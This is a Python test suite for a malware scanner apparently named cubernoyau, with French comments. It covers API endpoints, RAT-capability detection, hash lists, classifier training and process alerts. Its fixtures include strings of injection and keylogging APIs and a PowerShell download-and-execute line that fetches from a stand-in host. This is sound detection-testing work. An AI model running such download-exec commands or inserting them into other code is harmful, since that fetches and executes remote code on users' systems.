"""Moteur profond, fichiers volumineux, hachages connus, entrainement, retours."""
import json
import os
import struct
import time

import numpy as np
import pytest
from fastapi.testclient import TestClient

from cubernoyau.analysis import deep_analyzer
from cubernoyau.analysis.deep_analyzer import FEATURE_NAMES, deep_analyze
from server.app import create_app
from server.service import MonitorService
from cubernoyau.config import settings
from helpers import make_pe
from cubernoyau.storage.database import Database

RAT_STRINGS = [b"VirtualAllocEx", b"WriteProcessMemory", b"CreateRemoteThread",
               b"GetAsyncKeyState", b"SetWindowsHookEx", b"WSAStartup",
               b"Software\\Microsoft\\Windows\\CurrentVersion\\Run"]


def rat_file(path):
    path.write_bytes(b"MZ" + b"\x00" * 100 + b" ".join(RAT_STRINGS))
    return path


@pytest.fixture()
def service(tmp_path, monkeypatch):
    monkeypatch.setattr(settings, "MODELS_DIR", tmp_path / "models")
    monkeypatch.setattr(settings, "RULES_DIR", tmp_path / "rules")
    deep_analyzer.reload_rules()
    svc = MonitorService(Database(tmp_path / "t.db"), watch_dirs=[])
    yield svc
    svc.stop()
    svc.db.close()
    deep_analyzer.reload_rules()


@pytest.fixture()
def client(service):
    with TestClient(create_app(service, autostart=False)) as c:
        yield c


def codes(items):
    return {i["code"] for i in items}


def upload(client, path, kind="file"):
    with open(path, "rb") as f:
        r = client.post(f"/api/scan/{kind}", files={"file": (path.name, f)})
    assert r.status_code == 200, r.text
    return r.json()


# ---------------------------------------------------------------- moteur
def test_valid_pe_is_parsed(tmp_path):
    r = deep_analyze(make_pe(tmp_path / "ok.exe"))
    assert r["file_type"] == "pe" and r["pe"] and "error" not in r["pe"]
    assert "PE_PARSE_ERROR" not in codes(r["indicators"])
    assert set(r["features"]) == set(FEATURE_NAMES)


def test_rat_like_pe_is_high_risk(tmp_path, client):
    pe = make_pe(tmp_path / "update.exe", extra=b" ".join(RAT_STRINGS) + b" AsyncRAT")
    data = upload(client, pe)
    found = codes(data["risk_indicators"])
    assert {"RAT_LIKE_CAPABILITY_COMBO", "CAP_PROCESS_INJECTION", "CAP_KEYLOGGING",
            "RULE_MALWARE_FAMILY"} <= found
    assert data["risk"]["level"] == "RISQUE_ELEVE"
    assert data["deep"]["families"] == ["AsyncRAT"]


def test_utf16_strings_are_found(tmp_path):
    p = tmp_path / "net.exe"
    p.write_bytes(b"MZ" + b"\0" * 80 + "GetAsyncKeyState SetWindowsHookEx WSAStartup "
                  "CurrentVersion\\Run".encode("utf-16le"))
    assert "RAT_LIKE_CAPABILITY_COMBO" in codes(deep_analyze(p)["indicators"])


def test_plain_text_mentioning_apis_is_not_flagged(tmp_path):
    p = tmp_path / "notes.txt"
    p.write_text("VirtualAllocEx WriteProcessMemory GetAsyncKeyState WSAStartup AsyncRAT")
    assert deep_analyze(p)["indicators"] == []


def test_script_download_exec(tmp_path):
    p = tmp_path / "x.ps1"
    p.write_text("$c=[Convert]::FromBase64String($a); IEX (New-Object Net.WebClient).DownloadString('http://e.example/p')")
    assert "SCRIPT_DOWNLOAD_EXEC" in codes(deep_analyze(p)["indicators"])


def test_custom_json_rule(tmp_path, service):
    settings.RULES_DIR.mkdir()
    (settings.RULES_DIR / "mine.json").write_text(json.dumps([{
        "id": "demo", "name": "Famille Demo", "severity": "high",
        "strings": ["demo-marker-one", "demo-marker-two"], "min_matches": 2}]))
    deep_analyzer.reload_rules()
    p = tmp_path / "f.bin"
    p.write_bytes(b"xx demo-marker-one yy demo-marker-two")
    assert "RULE_demo" in codes(deep_analyze(p)["indicators"])
    p.write_bytes(b"xx demo-marker-one only")
    assert "RULE_demo" not in codes(deep_analyze(p)["indicators"])


def test_archive_and_pdf_checks(tmp_path):
    import zipfile
    z = tmp_path / "facture.zip"
    with zipfile.ZipFile(z, "w") as f:
        f.writestr("facture.pdf.exe", b"MZ")
    assert {"ARCHIVE_CONTAINS_EXECUTABLE", "ARCHIVE_DOUBLE_EXTENSION"} <= codes(deep_analyze(z)["indicators"])
    pdf = tmp_path / "a.pdf"
    pdf.write_bytes(b"%PDF-1.4 /OpenAction /JavaScript (app.alert(1))")
    assert "PDF_ACTIVE_CONTENT" in codes(deep_analyze(pdf)["indicators"])


# ---------------------------------------------------------------- gros fichiers
def test_large_file_is_accepted_and_hashed_entirely(tmp_path, client):
    import hashlib
    big = tmp_path / "gros.bin"
    with open(big, "wb") as f:
        for _ in range(60):
            f.write(b"\x00" * (1 << 20))
    data = upload(client, big)                     # 60 Mo : plus de limite a 50 Mo
    assert data["size_bytes"] == 60 << 20
    assert data["deep"]["partial_scan"] is True
    assert data["sha256"] == hashlib.sha256(big.read_bytes()).hexdigest()
    assert "PARTIAL_CONTENT_SCAN" in codes(data["risk_indicators"])


def test_signature_at_end_of_big_file_is_still_found(tmp_path):
    p = tmp_path / "tail.exe"
    with open(p, "wb") as f:
        f.write(b"MZ" + b"\x00" * ((60 << 20) - 2))
        f.write(b" ".join(RAT_STRINGS))
    assert "RAT_LIKE_CAPABILITY_COMBO" in codes(deep_analyze(p)["indicators"])


def test_upload_limit_can_still_be_configured(tmp_path, client, monkeypatch):
    monkeypatch.setattr(settings, "MAX_UPLOAD_MB", 1)
    p = tmp_path / "2mo.bin"
    p.write_bytes(b"a" * (2 << 20))
    with open(p, "rb") as f:
        assert client.post("/api/scan/file", files={"file": ("2mo.bin", f)}).status_code == 413


# ---------------------------------------------------------------- hachages connus
def test_known_hash_list_flags_file(tmp_path, client):
    p = tmp_path / "inconnu.bin"
    p.write_bytes(b"contenu quelconque 12345")
    sha = upload(client, p)["sha256"]
    assert upload(client, p)["risk"]["level"] == "AUCUN_INDICATEUR_DETECTE"
    text = "# liste\n" + f'"2024-01-01","{sha.upper()}","exe"\nligne sans hash\n' + "0" * 64
    r = client.post("/api/training/hashes", json={"text": text + "\n" + "a" * 64})
    assert r.json()["found"] == 3 and r.json()["added"] == 3
    data = upload(client, p)
    assert "KNOWN_MALWARE_HASH" in codes(data["risk_indicators"])
    assert data["risk"]["level"] == "RISQUE_ELEVE"


def test_hash_upload_endpoint(client):
    body = ("\n".join(f"{i:064x}" for i in range(1, 501))).encode()
    r = client.post("/api/training/hashes/upload", files={"file": ("liste.txt", body)})
    assert r.json()["added"] == 500
    assert client.get("/api/training/status").json()["known_hashes"] == 500


# ---------------------------------------------------------------- entrainement
def synth_samples(db, n=40, seed=0):
    rng = np.random.default_rng(seed)
    for i in range(n):
        for label in (0, 1):
            f = {k: 0.0 for k in FEATURE_NAMES}
            f.update(size_log=rng.uniform(4, 7), entropy_global=rng.uniform(4, 6.5) + 1.2 * label,
                     is_pe=1.0, n_imports_log=rng.uniform(1, 2.5) - 0.8 * label)
            if label:
                f.update(cap_injection=float(rng.integers(2, 6)), cap_keylogging=float(rng.integers(1, 3)),
                         n_susp_groups=float(rng.integers(2, 5)))
            else:
                f.update(cap_network=float(rng.integers(0, 3)))
            db.upsert_sample(f"{label}{i:03d}{seed}".ljust(64, "0"), label, "csv", f)


def test_training_needs_enough_data(client):
    r = client.post("/api/training/train", json={"wait": True})
    assert r.status_code == 400 and "insuffisantes" in r.json()["detail"]
    assert client.get("/api/training/status").json()["ready"] is False


def test_train_activate_and_use_model(tmp_path, client, service):
    synth_samples(service.db)
    r = client.post("/api/training/train", json={"wait": True})
    assert r.status_code == 200, r.text
    out = r.json()
    assert out["activated"] and out["metrics"]["f1"] >= 0.9 and out["metrics"]["n_test"] > 0
    status = client.get("/api/training/status").json()
    assert status["classifier_active"] and status["active_model"]["id"] == out["model_id"]
    # le modele s'applique aux nouvelles analyses
    data = upload(client, make_pe(tmp_path / "x.exe", extra=b" ".join(RAT_STRINGS)))
    assert data["deep"]["ml"]["available"] is True
    assert data["deep"]["ml"]["probability"] > 0.5
    assert "ML_MALWARE_PROBABILITY" in codes(data["risk_indicators"])
    benign = tmp_path / "doc.txt"
    benign.write_text("bonjour")
    assert upload(client, benign)["deep"]["ml"]["probability"] < 0.5


def test_background_training_job_and_activation(client, service):
    synth_samples(service.db)
    job = client.post("/api/training/train", json={}).json()
    for _ in range(100):
        j = client.get(f"/api/training/jobs/{job['id']}").json()
        if j["status"] != "running":
            break
        time.sleep(0.2)
    assert j["status"] == "done" and j["result"]["metrics"]["f1"] > 0.5
    second = client.post("/api/training/train", json={"wait": True, "activate": True}).json()
    first_id = j["result"]["model_id"]
    assert client.post(f"/api/training/activate/{first_id}").json()["active_model"]["id"] == first_id
    assert client.post("/api/training/activate/9999").status_code == 400
    assert second["model_id"] > first_id


def test_feedback_adds_sample_and_known_hash(tmp_path, client, service):
    p = tmp_path / "suspect.bin"
    p.write_bytes(b"un fichier que l'utilisateur juge malveillant")
    data = upload(client, p)
    r = client.post("/api/feedback", json={"scan_id": data["scan_id"], "label": "malware"})
    assert r.json()["samples"]["malware"] == 1
    assert service.db.lookup_hash(data["sha256"])
    assert "KNOWN_MALWARE_HASH" in codes(upload(client, p)["risk_indicators"])
    client.post("/api/feedback", json={"scan_id": data["scan_id"], "label": "benign"})
    assert service.db.lookup_hash(data["sha256"]) is None
    assert service.db.sample_counts()["benign"] == 1 and service.db.sample_counts()["malware"] == 0


def test_feedback_rejects_links_and_unknown_scans(client):
    scan = client.post("/api/scan/links", json={"urls": ["https://exemple.com"]}).json()["results"][0]
    assert client.post("/api/feedback", json={"scan_id": scan["scan_id"], "label": "malware"}).status_code == 400
    assert client.post("/api/feedback", json={"scan_id": 99999, "label": "malware"}).status_code == 404


def test_auto_training_triggers_on_new_data(service, monkeypatch):
    monkeypatch.setattr(settings, "AUTO_TRAIN_MIN_NEW", 10)
    assert service.training.maybe_auto_train() is None          # pas de donnees
    synth_samples(service.db)
    job = service.training.maybe_auto_train()
    assert job is not None
    for _ in range(100):
        if job["status"] != "running":
            break
        time.sleep(0.2)
    assert job["status"] == "done" and service.classifier.available
    assert service.training.maybe_auto_train() is None          # rien de nouveau
    service.db.set_setting("auto_train", "0")
    synth_samples(service.db, n=30, seed=7)
    assert service.training.maybe_auto_train() is None          # desactive


def test_ingest_folders_then_train(tmp_path, client, service):
    mal, ben = tmp_path / "mal", tmp_path / "ben"
    mal.mkdir(); ben.mkdir()
    rng = np.random.default_rng(1)
    for i in range(16):
        (mal / f"m{i}.exe").write_bytes(b"MZ" + rng.bytes(2000) + b" ".join(RAT_STRINGS[: 3 + i % 4]) + b" WSAStartup")
        (ben / f"b{i}.txt").write_text(f"document normal numero {i} " * 20)
    for folder, label in ((mal, "malware"), (ben, "benign")):
        job = client.post("/api/training/ingest-folder",
                          json={"path": str(folder), "label": label}).json()
        for _ in range(100):
            j = client.get(f"/api/training/jobs/{job['id']}").json()
            if j["status"] != "running":
                break
            time.sleep(0.1)
        assert j["status"] == "done" and j["result"]["added"] == 16
    assert service.db.count_known_hashes() == 16            # echantillons malveillants -> base de hachages
    assert client.post("/api/training/ingest-folder", json={"path": "/nope", "label": "benign"}).status_code == 404
    out = client.post("/api/training/train", json={"wait": True}).json()
    assert out["metrics"]["recall"] >= 0.9 and out["metrics"]["precision"] >= 0.9


def test_csv_export_import_roundtrip(client, service, tmp_path):
    synth_samples(service.db, n=12)
    csv_text = client.get("/api/training/export").text
    assert csv_text.splitlines()[0].startswith("sha256,label,size_log")
    other = Database(tmp_path / "other.db")
    from cubernoyau.models.file_classifier import FileClassifier
    from cubernoyau.training.service import TrainingService
    ts = TrainingService(other, FileClassifier(other), tmp_path / "m2")
    assert ts.import_features_csv(csv_text)["added"] == 24
    assert other.sample_counts()["total"] == 24
    assert client.post("/api/training/import-features",
                       files={"file": ("x.csv", b"a,b\n1,2")}).status_code == 400


# ---------------------------------------------------------------- surveillance en continu
def test_running_rat_is_alerted(tmp_path, service, monkeypatch):
    """Un programme malveillant en cours d'execution doit declencher une alerte."""
    from cubernoyau.collectors.process_collector import collect_processes
    rat = make_pe(tmp_path / "svchost32.exe", extra=b" ".join(RAT_STRINGS) + b" njRAT")
    procs = collect_processes(include_cmdline=True)
    procs[0]["executable"] = str(rat)
    monkeypatch.setattr("server.service.collect_processes", lambda **kw: procs)
    service.run_cycle()
    item = next(p for p in service.latest_processes if p["pid"] == procs[0]["pid"])
    assert item["risk"]["level"] == "RISQUE_ELEVE"
    assert "RAT_LIKE_CAPABILITY_COMBO" in codes(item["indicators"])
    sources = {a["source"] for a in service.db.list_alerts()}
    assert {"application", "process"} <= sources
